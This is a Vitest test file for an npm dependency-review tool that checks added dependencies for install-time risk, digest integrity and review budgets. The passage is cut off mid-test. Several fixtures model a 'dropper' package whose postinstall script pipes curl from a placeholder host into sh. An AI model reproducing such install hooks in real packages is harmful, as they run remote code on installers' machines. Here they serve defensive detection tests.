// @ts-nocheck
import { describe, expect, test, vi } from "vitest";

vi.mock("cloudflare:workers", () => ({
  WorkerEntrypoint: class {},
}));

const npmConnectionMock = vi.hoisted(() => ({
  getNpmConnection: vi.fn(),
}));

vi.mock("../server/db/npm-connections.ts", async () => ({
  ...(await vi.importActual("../server/db/npm-connections.ts")),
  getNpmConnection: npmConnectionMock.getNpmConnection,
}));

const {
  inspectAddedNpmDependencies,
  inspectBundledNpmDependenciesForAdapter,
  resolveDependencyVersion,
} = await import("../server/lib/ecosystems/npm/dependency-artifacts");
const { createNpmBroker } = await import("../server/lib/ecosystems/npm/broker");
const { npmAdapter } = await import("../server/lib/ecosystems/npm");
const { npmGateAdapter } = await import("../server/lib/ecosystems/npm/gate-review");
const { summarizePackageJsonDiff } = await import("../server/lib/review");
const { SandboxError } = await import("../server/lib/sandbox");

function file(path, textSample) {
  return { path, size: textSample.length, sha256: "", textSample, flags: [] };
}

function packument(name, versions) {
  return {
    versions: Object.fromEntries(
      Object.entries(versions).map(([version, dist]) => [
        version,
        {
          dist: { tarball: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`, ...dist },
        },
      ]),
    ),
    "dist-tags": { latest: Object.keys(versions).at(-1) },
  };
}

// A broker stub that records what it was asked for. The real broker's
// credential-free methods are the boundary under test everywhere else; here
// the point is the orchestration around them.
function brokerStub({ metadata = {}, downloads = {}, onDownload } = {}) {
  const calls = { metadata: [], downloads: [], registryUrl: 0 };
  return {
    calls,
    dispose() {},
    async registryUrl() {
      calls.registryUrl += 1;
      return "https://registry.npmjs.org";
    },
    async fetchAnonymousPackageMetadata(name) {
      calls.metadata.push(name);
      return metadata[name] ?? null;
    },
    async downloadAnonymousTarball(url, opts) {
      calls.downloads.push({ url, opts });
      if (onDownload) return onDownload(url);
      const result = downloads[url];
      if (!result)
        throw new SandboxError(JSON.stringify({ error: "download failed", status: 404 }));
      return result;
    },
    async fetchPackageMetadata() {
      throw new Error("credentialed metadata must not be used for dependency review");
    },
    async downloadPublished() {
      throw new Error("credentialed download must not be used for dependency review");
    },
    async fetchStagedDetails() {
      throw new Error("not used");
    },
    async downloadStaged() {
      throw new Error("not used");
    },
  };
}

function inspect(broker, previous, staged, extra = {}) {
  return inspectAddedNpmDependencies({
    manifestDiff: summarizePackageJsonDiff(previous, staged),
    resolveRegistryUrl: () => broker.registryUrl(),
    broker,
    scanId: "scan-1",
    organizationId: "org-1",
    ...extra,
  });
}

const DROPPER_TARBALL = {
  files: [
    file(
      "package.json",
      JSON.stringify({
        name: "proc-macro1",
        version: "0.1.0",
        scripts: { postinstall: "node build.js" },
      }),
    ),
    file(
      "build.js",
      'const { execSync } = require("child_process");\nexecSync("curl -sL https://cdn.example.com/p.sh | sh");',
    ),
  ],
  packageJson: {
    name: "proc-macro1",
    version: "0.1.0",
    scripts: { postinstall: "node build.js" },
  },
  archiveSha1: "aa".repeat(20),
  // Hex, which is what the sandbox digester returns.
  archiveSha512: "ab".repeat(64),
};

// The same 64 bytes npm would publish as base64 SRI. npm emits `dist.integrity`
// in base64 and the sandbox returns hex, so a comparison that skips the
// conversion reports a mismatch on every healthy dependency.
const DROPPER_SRI = `sha512-${btoa(String.fromCharCode(...Array.from({ length: 64 }, () => 0xab)))}`;

describe("resolveDependencyVersion", () => {
  const metadata = {
    versions: { "1.0.0": {}, "1.4.7": {}, "2.0.0": {} },
    "dist-tags": { latest: "2.0.0", next: "1.4.7" },
  };

  test("a dist-tag resolves through the tag map, not the range matcher", () => {
    expect(resolveDependencyVersion(metadata, "latest")).toBe("2.0.0");
    expect(resolveDependencyVersion(metadata, "next")).toBe("1.4.7");
  });

  test("a range resolves to its highest satisfying version", () => {
    expect(
      resolveDependencyVersion(
        {
          versions: { "1.0.0": {}, "1.4.7": {} },
          "dist-tags": { latest: "1.0.0", next: "1.4.7" },
        },
        "^1.0.0",
      ),
    ).toBe("1.4.7");
  });

  test("a range falls back to its highest match when latest is outside it", () => {
    expect(resolveDependencyVersion(metadata, "^1.0.0")).toBe("1.4.7");
  });

  test("range ordering is independent of deprecation metadata", () => {
    expect(
      resolveDependencyVersion(
        {
          versions: { "1.0.0": {}, "1.1.0": { deprecated: true } },
          "dist-tags": { latest: "1.1.0" },
        },
        "^1.0.0",
      ),
    ).toBe("1.1.0");
  });

  test("a range uses the highest deprecated match only when every match is deprecated", () => {
    expect(
      resolveDependencyVersion(
        {
          versions: {
            "1.0.0": { deprecated: true },
            "1.1.0": { deprecated: true },
          },
          "dist-tags": { latest: "1.0.0" },
        },
        "^1.0.0",
      ),
    ).toBe("1.1.0");
  });

  test("an explicit dist-tag still resolves to its deprecated target", () => {
    expect(
      resolveDependencyVersion(
        {
          versions: { "1.0.0": { deprecated: true } },
          "dist-tags": { legacy: "1.0.0" },
        },
        "legacy",
      ),
    ).toBe("1.0.0");
  });

  test("a dist-tag pointing at an unpublished version does not resolve", () => {
    expect(
      resolveDependencyVersion(
        { versions: { "1.0.0": {} }, "dist-tags": { latest: "9.9.9" } },
        "latest",
      ),
    ).toBeNull();
  });

  test.each(["1.0.0", "1", "v1", "v1.2"])(
    "a registry-controlled %s dist-tag cannot override an exact or range declaration",
    (spec) => {
      expect(
        resolveDependencyVersion(
          {
            versions: { "1.0.0": {}, "1.9.0": {}, "9.9.9": {} },
            "dist-tags": { latest: "1.9.0", [spec]: "9.9.9" },
          },
          spec,
        ),
      ).toBe(spec === "1.0.0" ? "1.0.0" : spec === "v1.2" ? null : "1.9.0");
    },
  );
});

describe("NpmBroker registry snapshot", () => {
  test("keeps one registry URL for every anonymous read in a broker lifetime", async () => {
    npmConnectionMock.getNpmConnection
      .mockResolvedValueOnce({ validationStatus: "valid", registryUrl: "https://registry-a.test" })
      .mockResolvedValueOnce({ validationStatus: "valid", registryUrl: "https://registry-b.test" });
    const broker = createNpmBroker(
      { env: {}, executionCtx: {}, db: {}, session: {} },
      { organizationId: "org-1" },
    );

    await expect(Promise.all([broker.registryUrl(), broker.registryUrl()])).resolves.toEqual([
      "https://registry.npmjs.org",
      "https://registry.npmjs.org",
    ]);
    await expect(broker.registryUrl()).resolves.toBe("https://registry.npmjs.org");
    expect(npmConnectionMock.getNpmConnection).not.toHaveBeenCalled();
  });
});

describe("inspectAddedNpmDependencies", () => {
  test("honors a release-wide record budget exhausted by embedded dependencies", async () => {
    const broker = brokerStub({ metadata: { added: packument("added", { "1.0.0": {} }) } });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { added: "1.0.0" } },
      { maxRecordedDependencies: 0 },
    );

    expect(review).toMatchObject({
      status: "partial",
      selectedCount: 1,
      inspectedCount: 0,
      uninspectableCount: 1,
      omittedCount: 1,
      dependencies: [],
      evidence: [],
    });
    expect(review.findings).toEqual([
      expect.objectContaining({
        ruleId: "dependency.artifact-unavailable",
        severity: "medium",
        evidence: expect.stringContaining("1 additional direct dependency"),
      }),
    ]);
    expect(broker.calls.metadata).toEqual([]);
    expect(broker.calls.downloads).toEqual([]);
  });

  test("a release adding a dropper dependency records the whole path", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", { "0.1.0": { integrity: DROPPER_SRI } }),
      },
      downloads: { [url]: DROPPER_TARBALL },
    });

    const review = await inspect(
      broker,
      { name: "arrayref", version: "0.3.9", dependencies: {} },
      { name: "arrayref", version: "0.3.10", dependencies: { "proc-macro1": "0.1.0" } },
    );

    expect(review.status).toBe("complete");
    expect(review.selectedCount).toBe(1);
    expect(review.inspectedCount).toBe(1);
    const [dependency] = review.dependencies;
    expect(dependency).toMatchObject({
      name: "proc-macro1",
      resolvedVersion: "0.1.0",
      declarationKind: "exact",
      status: "inspected",
      observation: { execution: "observed", risk: "observed" },
      registryHost: "registry.npmjs.org",
      artifactOrigin: "https://registry.npmjs.org",
      fileCount: 2,
    });
    expect(dependency.automaticExecution).toEqual([{ kind: "script", name: "postinstall" }]);
    expect(dependency.installReachableCapabilities).toContain("code.remote-shell");
  });

  test("the recomputed digest is bound to the digest the registry advertised", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", { "0.1.0": { integrity: DROPPER_SRI } }),
      },
      downloads: { [url]: DROPPER_TARBALL },
    });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );
    // Both sides are normalized to hex so the record's two rows are directly
    // comparable, and so the SRI conversion is what is under test here.
    expect(review.dependencies[0].declaredDigest).toEqual({
      algorithm: "sha512",
      value: "ab".repeat(64),
    });
    expect(review.dependencies[0].reviewedDigest).toEqual({
      algorithm: "sha512",
      value: "ab".repeat(64),
    });
    expect(review.dependencies[0].digestVerified).toBe(true);
  });

  test("any matching SHA-512 entry satisfies a multi-hash SRI", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const wrong = `sha512-${btoa(String.fromCharCode(...Array.from({ length: 64 }, () => 0x11)))}`;
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", {
          "0.1.0": { integrity: `${wrong} ${DROPPER_SRI}` },
        }),
      },
      downloads: { [url]: DROPPER_TARBALL },
    });

    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );

    expect(review.dependencies[0].declaredDigest).toEqual({
      algorithm: "sha512",
      value: "ab".repeat(64),
    });
    expect(review.dependencies[0].digestVerified).toBe(true);
  });

  test("persisted artifact provenance drops registry-controlled URL secrets", async () => {
    const safeUrl = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const fetchedUrl = `${safeUrl}?X-Amz-Credential=fake#fragment`;
    const broker = brokerStub({
      metadata: {
        "proc-macro1": {
          versions: {
            "0.1.0": { dist: { tarball: fetchedUrl, integrity: DROPPER_SRI } },
          },
          "dist-tags": { latest: "0.1.0" },
        },
      },
      downloads: { [fetchedUrl]: DROPPER_TARBALL },
    });

    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );

    expect(broker.calls.downloads[0].url).toBe(fetchedUrl);
    expect(review.dependencies[0].artifactOrigin).toBe("https://registry.npmjs.org");
    expect(review.evidence[0].resolution.tarballUrl).toBe(safeUrl);
  });

  test("a digest the registry and the bytes disagree on is recorded as unverified-false", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", {
          "0.1.0": {
            integrity: `sha512-${btoa(String.fromCharCode(...Array.from({ length: 64 }, () => 0x11)))}`,
          },
        }),
      },
      downloads: { [url]: DROPPER_TARBALL },
    });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );
    expect(review.dependencies[0].digestVerified).toBe(false);
    expect(review).toMatchObject({
      status: "partial",
      inspectedCount: 0,
      uninspectableCount: 1,
    });
    expect(review.evidence[0]).toMatchObject({
      outcome: "fetch-failed",
      outcomeDetail: "downloaded artifact did not match registry integrity metadata",
      entrypoints: null,
    });
    expect(review.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "dependency.artifact-unavailable",
          severity: "critical",
        }),
      ]),
    );
  });

  test("a registry that answers nothing to a credential-free request fails visibly", async () => {
    // The private-dependency case. Drydock does not retry with the org token:
    // the review records a gap and the release cannot read as fully reviewed.
    const broker = brokerStub({ metadata: {} });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "@private/internal": "^1.0.0" } },
    );
    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "metadata-unavailable",
    });
    expect(review.evidence[0]).toMatchObject({
      outcome: "metadata-unavailable",
      outcomeDetail: "metadata-unavailable",
    });
    expect(broker.calls.downloads).toEqual([]);
  });

  test("a published package with no version matching the declaration is distinct from a metadata miss", async () => {
    const broker = brokerStub({ metadata: { added: packument("added", { "1.0.0": {} }) } });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { added: "^2.0.0" } },
    );

    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "no-matching-version",
    });
    expect(review.evidence[0]).toMatchObject({
      outcome: "no-matching-version",
      outcomeDetail: "no-matching-version",
    });
    expect(broker.calls.downloads).toEqual([]);
  });

  test("keeps same-name declarations in separate sections bound to their own artifacts", async () => {
    const metadata = { shared: packument("shared", { "1.0.0": {}, "2.0.0": {} }) };
    const downloads = Object.fromEntries(
      ["1.0.0", "2.0.0"].map((version) => [
        `https://registry.npmjs.org/shared/-/shared-${version}.tgz`,
        {
          files: [file("package.json", JSON.stringify({ name: "shared", version }))],
          packageJson: { name: "shared", version },
        },
      ]),
    );
    const broker = brokerStub({ metadata, downloads });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      {
        name: "p",
        version: "1.0.1",
        dependencies: { shared: "1.0.0" },
        peerDependencies: { shared: "2.0.0" },
      },
    );

    expect(review.evidence).toEqual([
      expect.objectContaining({
        name: "shared",
        section: "dependencies",
        declaredSpec: "1.0.0",
        outcome: "inspected",
        resolution: expect.objectContaining({ version: "1.0.0" }),
      }),
      expect.objectContaining({
        name: "shared",
        section: "peerDependencies",
        declaredSpec: "2.0.0",
        outcome: "inspected",
        resolution: expect.objectContaining({ version: "2.0.0" }),
      }),
    ]);
    expect(broker.calls.metadata).toEqual(["shared", "shared"]);
    expect(broker.calls.downloads.map(({ url }) => url)).toEqual([
      "https://registry.npmjs.org/shared/-/shared-1.0.0.tgz",
      "https://registry.npmjs.org/shared/-/shared-2.0.0.tgz",
    ]);
  });

  test("still fetches a same-name required peer when the runtime declaration is bundled", async () => {
    const broker = brokerStub({
      metadata: { shared: packument("shared", { "2.0.0": {} }) },
      downloads: {
        "https://registry.npmjs.org/shared/-/shared-2.0.0.tgz": {
          files: [file("package.json", '{"name":"shared","version":"2.0.0"}')],
          packageJson: { name: "shared", version: "2.0.0" },
        },
      },
    });
    const staged = {
      name: "p",
      version: "1.0.1",
      dependencies: { shared: "1.0.0" },
      peerDependencies: { shared: "2.0.0" },
      bundleDependencies: ["shared"],
    };
    const review = await inspect(broker, { name: "p", version: "1.0.0" }, staged, {
      stagedManifest: staged,
      stagedFiles: [
        file("node_modules/shared/package.json", '{"name":"shared","version":"1.0.0"}'),
      ],
    });

    expect(review.evidence).toEqual([
      expect.objectContaining({
        name: "shared",
        section: "peerDependencies",
        declaredSpec: "2.0.0",
        outcome: "inspected",
        resolution: expect.objectContaining({ version: "2.0.0" }),
      }),
    ]);
    expect(broker.calls.downloads.map(({ url }) => url)).toEqual([
      "https://registry.npmjs.org/shared/-/shared-2.0.0.tgz",
    ]);
  });

  test("a git spec is recorded as unresolvable without any fetch", async () => {
    const broker = brokerStub();
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { tool: "github:owner/repo" } },
    );
    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "unresolvable-spec",
    });
    expect(broker.calls.metadata).toEqual([]);
  });

  test("an oversized artifact is a size gap, not a download failure", async () => {
    const broker = brokerStub({
      metadata: { big: packument("big", { "1.0.0": {} }) },
      onDownload() {
        throw new SandboxError(JSON.stringify({ error: "tarball too large", status: 413 }));
      },
    });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { big: "1.0.0" } },
    );
    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "artifact-too-large",
      resolvedVersion: "1.0.0",
    });
  });

  test("dependencies past the per-release budget are recorded, not silently dropped", async () => {
    const names = ["a", "b", "c", "d", "e", "f", "g", "h"];
    const metadata = Object.fromEntries(
      names.map((name) => [name, packument(name, { "1.0.0": {} })]),
    );
    const downloads = Object.fromEntries(
      names.map((name) => [
        `https://registry.npmjs.org/${name}/-/${name}-1.0.0.tgz`,
        {
          files: [file("package.json", JSON.stringify({ name, version: "1.0.0" }))],
          packageJson: { name, version: "1.0.0" },
        },
      ]),
    );
    const broker = brokerStub({ metadata, downloads });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      {
        name: "p",
        version: "1.0.1",
        dependencies: Object.fromEntries(names.map((name) => [name, "1.0.0"])),
      },
    );
    expect(review.status).toBe("complete");
    expect(review.selectedCount).toBe(8);
    expect(review.inspectedCount).toBe(8);
    expect(
      review.dependencies.filter((entry) => entry.reason === "budget-exhausted").map((e) => e.name),
    ).toEqual([]);
  });

  test("the wall-clock budget stops fetching without failing the review", async () => {
    const names = ["a", "b", "c"];
    const metadata = Object.fromEntries(
      names.map((name) => [name, packument(name, { "1.0.0": {} })]),
    );
    const downloads = Object.fromEntries(
      names.map((name) => [
        `https://registry.npmjs.org/${name}/-/${name}-1.0.0.tgz`,
        {
          files: [file("package.json", JSON.stringify({ name, version: "1.0.0" }))],
          packageJson: { name, version: "1.0.0" },
        },
      ]),
    );
    const broker = brokerStub({ metadata, downloads });
    let clock = 0;
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { a: "1.0.0", b: "1.0.0", c: "1.0.0" } },
      {
        now: () => {
          clock += 15_000;
          return clock;
        },
      },
    );
    expect(review.status).toBe("partial");
    expect(review.inspectedCount).toBe(1);
    expect(review.dependencies.filter((e) => e.reason === "budget-exhausted")).toHaveLength(2);
  });

  test("the wall-clock budget stops waiting for an in-flight registry request", async () => {
    const broker = brokerStub({
      metadata: { hanging: packument("hanging", { "1.0.0": {} }) },
    });
    broker.fetchAnonymousPackageMetadata = async () => new Promise(() => {});
    const startedAt = Date.now();
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { hanging: "1.0.0" } },
      { budgetMs: 10 },
    );
    expect(Date.now() - startedAt).toBeLessThan(1_000);
    expect(review).toMatchObject({
      status: "partial",
      selectedCount: 1,
      inspectedCount: 0,
      uninspectableCount: 1,
      dependencies: [{ name: "hanging", reason: "budget-exhausted" }],
    });
  });

  test("metadata settling after the deadline cannot start an artifact download", async () => {
    const broker = brokerStub();
    let resolveMetadata;
    broker.fetchAnonymousPackageMetadata = async () =>
      new Promise((resolve) => {
        resolveMetadata = resolve;
      });
    const reviewPromise = inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { late: "1.0.0" } },
      { budgetMs: 10 },
    );

    const review = await reviewPromise;
    resolveMetadata(packument("late", { "1.0.0": {} }));
    await new Promise((resolve) => setTimeout(resolve, 0));

    expect(review.dependencies[0]).toMatchObject({ reason: "budget-exhausted" });
    expect(broker.calls.downloads).toEqual([]);
  });

  test("the wall-clock budget includes resolving the registry connection", async () => {
    const broker = brokerStub();
    broker.registryUrl = async () => new Promise(() => {});
    const startedAt = Date.now();
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { hanging: "1.0.0" } },
      { budgetMs: 10 },
    );
    expect(Date.now() - startedAt).toBeLessThan(1_000);
    expect(review).toMatchObject({
      status: "partial",
      dependencies: [{ name: "hanging", reason: "budget-exhausted" }],
    });
  });

  test("bounds persisted dependency records independently of selected count", async () => {
    const names = Array.from({ length: 80 }, (_, index) => `dependency-${index}`);
    const metadata = Object.fromEntries(
      names.map((name) => [name, packument(name, { "1.0.0": {} })]),
    );
    const downloads = Object.fromEntries(
      names.map((name) => [
        `https://registry.npmjs.org/${name}/-/${name}-1.0.0.tgz`,
        {
          files: [file("package.json", JSON.stringify({ name, version: "1.0.0" }))],
          packageJson: { name, version: "1.0.0" },
        },
      ]),
    );
    const review = await inspect(
      brokerStub({ metadata, downloads }),
      { name: "p", version: "1.0.0" },
      {
        name: "p",
        version: "1.0.1",
        dependencies: Object.fromEntries(names.map((name) => [name, "1.0.0"])),
      },
    );
    expect(review).toMatchObject({
      status: "partial",
      selectedCount: 80,
      inspectedCount: 8,
      uninspectableCount: 72,
      omittedCount: 16,
    });
    expect(review.dependencies).toHaveLength(64);
    expect(review.evidence).toHaveLength(64);
    expect(
      review.findings.filter((finding) => finding.ruleId === "dependency.artifact-unavailable"),
    ).toHaveLength(57);
    expect(review.findings.at(-1)).toEqual(
      expect.objectContaining({
        ruleId: "dependency.artifact-unavailable",
        evidence: expect.stringContaining("16 additional direct dependencies"),
      }),
    );
  });

  test("a registry lookup failure remains a visible review gap", async () => {
    const broker = brokerStub();
    broker.registryUrl = async () => {
      throw new Error("D1 unavailable");
    };
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { added: "1.0.0" } },
    );
    expect(review).toMatchObject({
      status: "partial",
      selectedCount: 1,
      inspectedCount: 0,
      uninspectableCount: 1,
      dependencies: [{ name: "added", reason: "review-failed" }],
    });
  });

  test("a release without a baseline does not treat its whole manifest as added", async () => {
    const broker = brokerStub();
    const review = await inspect(
      broker,
      null,
      { name: "p", version: "1.0.0", dependencies: { added: "1.0.0" } },
      { baselineManifestUnavailable: true },
    );
    expect(review).toEqual(expect.objectContaining({ status: "not-applicable", selectedCount: 0 }));
    expect(broker.calls.metadata).toEqual([]);
  });

  test("a release that adds no installable dependency does no work at all", async () => {
    const broker = brokerStub();
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", devDependencies: { vitest: "^4.0.0" } },
    );
    expect(review).toEqual({
      status: "not-applicable",
      selectedCount: 0,
      inspectedCount: 0,
      uninspectableCount: 0,
      omittedCount: 0,
      dependencies: [],
    });
    expect(broker.calls.metadata).toEqual([]);
    // Most releases add no dependency, and resolving the registry costs a D1
    // read — nothing should happen at all for those scans.
    expect(broker.calls.registryUrl).toBe(0);
  });

  test("a legacy version with only dist.shasum still binds to its bytes", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", { "0.1.0": { shasum: "AA".repeat(20) } }),
      },
      downloads: { [url]: DROPPER_TARBALL },
    });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );
    expect(review.dependencies[0].declaredDigest).toEqual({
      algorithm: "sha1",
      value: "aa".repeat(20),
    });
    expect(review.dependencies[0].digestVerified).toBe(true);
  });

  test("an unsupported SRI cannot fall through to a matching legacy shasum", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", {
          "0.1.0": {
            integrity: `sha256-${Buffer.alloc(32).toString("base64")}`,
            shasum: "AA".repeat(20),
          },
        }),
      },
      downloads: { [url]: DROPPER_TARBALL },
    });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );
    expect(review.dependencies[0].declaredDigest).toBeNull();
    expect(review.dependencies[0].digestVerified).toBeNull();
  });

  test("a projected oversized SRI cannot fall through to a matching legacy shasum", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", {
          "0.1.0": {
            integrityPresent: true,
            shasum: "AA".repeat(20),
          },
        }),
      },
      downloads: { [url]: DROPPER_TARBALL },
    });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );

    expect(review.dependencies[0].declaredDigest).toBeNull();
    expect(review.dependencies[0].digestVerified).toBeNull();
  });

  test("does not persist malformed registry digests", async () => {
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", {
          "0.1.0": { integrity: `sha512-${"A".repeat(5_000)}`, shasum: "not-a-sha1" },
        }),
      },
      downloads: {
        "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz": DROPPER_TARBALL,
      },
    });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );
    expect(review.dependencies[0].declaredDigest).toBeNull();
    expect(review.dependencies[0].digestVerified).toBeNull();
  });

  test("a digest nothing recomputed is unverified, never a mismatch", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", { "0.1.0": { integrity: DROPPER_SRI } }),
      },
      downloads: {
        // Digest cap hit / stream cancelled upstream: the sandbox reports null
        // rather than a partial digest.
        [url]: { ...DROPPER_TARBALL, archiveSha1: null, archiveSha512: null },
      },
    });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );
    expect(review.dependencies[0].digestVerified).toBeNull();
    expect(review.dependencies[0].status).toBe("inspected");
  });

  test("dependency artifacts are parsed with the bounded retention budget", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const broker = brokerStub({
      metadata: { "proc-macro1": packument("proc-macro1", { "0.1.0": {} }) },
      downloads: { [url]: DROPPER_TARBALL },
    });
    await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );
    expect(broker.calls.downloads[0].opts).toMatchObject({
      maxFiles: 800,
      maxBytes: 25 * 1024 * 1024,
      maxTextSampleChars: 256 * 1024,
    });
    expect(broker.calls.downloads[0].opts.timeoutMs).toBeGreaterThan(0);
    expect(broker.calls.downloads[0].opts.timeoutMs).toBeLessThanOrEqual(30_000);
  });

  test.each(["baseline-truncated", "content-skipped"])(
    "a dependency file flagged %s is uninspectable instead of partially assessed",
    async (flag) => {
      const url = "https://registry.npmjs.org/clipped/-/clipped-1.0.0.tgz";
      const clipped = {
        files: [
          file("package.json", JSON.stringify({ name: "clipped", version: "1.0.0" })),
          { ...file("install.js", "console.log('prefix')"), flags: [flag] },
        ],
        packageJson: { name: "clipped", version: "1.0.0" },
        archiveSha512: "ab".repeat(64),
      };
      const broker = brokerStub({
        metadata: { clipped: packument("clipped", { "1.0.0": {} }) },
        downloads: { [url]: clipped },
      });
      const review = await inspect(
        broker,
        { name: "p", version: "1.0.0" },
        { name: "p", version: "1.0.1", dependencies: { clipped: "1.0.0" } },
      );
      expect(review.dependencies[0]).toMatchObject({
        status: "uninspectable",
        reason: "artifact-truncated",
        fileCount: 2,
        reviewedDigest: { algorithm: "sha512", value: "ab".repeat(64) },
      });
      expect(review.dependencies[0].automaticExecution).toEqual([]);
    },
  );

  test("unrelated truncation preserves install risk proven by retained bytes", async () => {
    const url = "https://registry.npmjs.org/clipped/-/clipped-1.0.0.tgz";
    const manifest = {
      name: "clipped",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const archive = {
      files: [
        file("package.json", JSON.stringify(manifest)),
        file(
          "install.js",
          'require("child_process").execSync("curl https://example.invalid/p | sh")',
        ),
        {
          path: "unrelated.bin",
          size: 4096,
          sha256: "skipped-unrelated",
          flags: ["content-skipped"],
        },
      ],
      packageJson: manifest,
      archiveSha512: "ab".repeat(64),
    };
    const review = await inspect(
      brokerStub({
        metadata: { clipped: packument("clipped", { "1.0.0": {} }) },
        downloads: { [url]: archive },
      }),
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { clipped: "1.0.0" } },
    );

    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "artifact-truncated",
      observation: { execution: "observed", risk: "observed" },
    });
    expect(review.dependencies[0].installReachableCapabilities).toContain("code.remote-shell");
    expect(review.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "dependency.install-time-capability",
          severity: "critical",
        }),
        expect.objectContaining({
          ruleId: "dependency.artifact-unavailable",
          severity: "medium",
        }),
      ]),
    );
  });

  test("an install-reachable minified file with skipped text is uninspectable", async () => {
    const url = "https://registry.npmjs.org/clipped/-/clipped-1.0.0.tgz";
    const manifest = {
      name: "clipped",
      version: "1.0.0",
      scripts: { postinstall: "node install.min.js" },
    };
    const clipped = {
      files: [
        file("package.json", JSON.stringify(manifest)),
        {
          path: "install.min.js",
          size: 4096,
          sha256: "skipped-install",
          flags: ["text-sample-skipped"],
        },
      ],
      packageJson: manifest,
      archiveSha512: "ab".repeat(64),
    };
    const review = await inspect(
      brokerStub({
        metadata: { clipped: packument("clipped", { "1.0.0": {} }) },
        downloads: { [url]: clipped },
      }),
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { clipped: "1.0.0" } },
    );

    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "artifact-truncated",
      resolvedVersion: "1.0.0",
      fileCount: 2,
    });
  });

  test("a dynamically loaded skipped source map is uninspectable", async () => {
    const url = "https://registry.npmjs.org/clipped/-/clipped-1.0.0.tgz";
    const manifest = {
      name: "clipped",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const archive = {
      files: [
